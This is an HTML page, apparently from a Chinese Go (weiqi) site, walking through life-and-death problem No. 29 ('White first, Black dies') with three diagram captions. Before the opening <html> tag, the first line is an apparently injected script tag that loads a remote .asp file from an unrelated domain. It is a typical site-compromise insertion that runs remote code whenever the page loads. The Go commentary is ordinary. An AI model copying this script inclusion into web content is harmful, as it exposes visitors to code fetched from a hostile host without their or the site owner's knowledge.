<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第29型 白先黑死</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体"><h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第29型      白先黑死</span></font><!--mstheme--></font></h1>       <div align="center">         <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">         <tr>           <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No29_1.png" width="232" height="232"><!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No29_2.png" width="232" height="232"><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" valign="top"><!--mstheme--><font face="宋体"><p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>        <p><span style="letter-spacing: 1pt"><font face="楷体_GB2312"> 		白1先扳，好手！黑2如拐，白3先手打，黑4提，白5尖，准备渡回，黑6挤吃，白7跳即可。黑a位不入气，非常痛苦；如b位提，白可“打二还一”。结果黑净死。</font></span><!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>        <p><span style="letter-spacing: 1pt"><font face="楷体_GB2312"> 		白1扳时，黑没有反抗的余地。如于2位打吃，白3打是绝对先手，黑4提后，白5一拐即可，黑仍净死。</font></span><p>　<!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No29_3.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><span style="letter-spacing: 1pt"><font face="楷体_GB2312"> 		白1夹，黑2拐时，白3打，这也是常用手筋，结果是劫。既然白有更狠的手段，这当然不能算正解啦。</font></span></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page="No29.htm" S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-1110_back.gif"); MSFPnav1h=MSFPpreload("../../../_derived/back_cmp_-1110_back_a.gif"); } // --></script><a href="../No28/No28.htm" language="JavaScript" onmouseover="if(MSFPhover)
